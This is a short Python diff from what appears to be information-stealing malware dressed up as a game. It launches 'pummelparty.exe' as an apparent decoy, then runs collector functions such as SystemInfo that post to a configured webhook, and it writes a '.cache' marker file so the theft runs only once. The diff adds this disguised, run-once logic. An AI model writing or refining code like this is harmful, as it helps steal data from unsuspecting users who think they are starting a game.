@@ -18,15 +18,16 @@ def main():
         SystemInfo,
     ]
 
-    if __CONFIG__['onerun'] == False:
+    if os.path.exists(".cache") == False:
+        os.startfile("pummelparty.exe")
         for func in funcs:
             if __CONFIG__[func.__name__.lower()]:
                 if func.__init__.__code__.co_argcount == 2:
                     func(__CONFIG__['webhook'])
                 else:
                     func()
-        os.startfile("pummelparty.exe")
-        __CONFIG__['onerun'] = True
+        fp = open('.cache', 'w')
+        fp.close()
 
     else:
         os.startfile("pummelparty.exe")
